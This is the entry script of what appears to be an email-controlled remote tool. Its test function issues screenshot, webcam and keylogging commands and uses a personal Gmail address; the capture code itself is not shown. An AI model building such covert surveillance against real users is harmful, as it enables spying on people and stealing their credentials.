from classMail import *
from loading import *
import GUI


def test_main():
    mail = Mail()
    mail.cmd_list = ["screenshot a", "webcam b", "keylog 10", "logout"]
    mail.cmd_list = [i.split(" ") for i in mail.cmd_list]
    mail.process_command()
    mail.sender = "17mels22@gmail.com"
    mail.write_log()
    # mail.send_mail()


def main():
    mail = Mail()
    app = GUI.App()
    app.after(0, lambda: mail.run(app))
    app.mainloop()
    print("\rQuit                             ")

if __name__ == "__main__":
    picture = "Files\\Pictures"  # Guarantee the Files folder
    if not os.path.exists(picture):
        os.makedirs(picture)

    try:
        main()
        # test_main()
    except KeyboardInterrupt:
        print("\rQuit                             ")
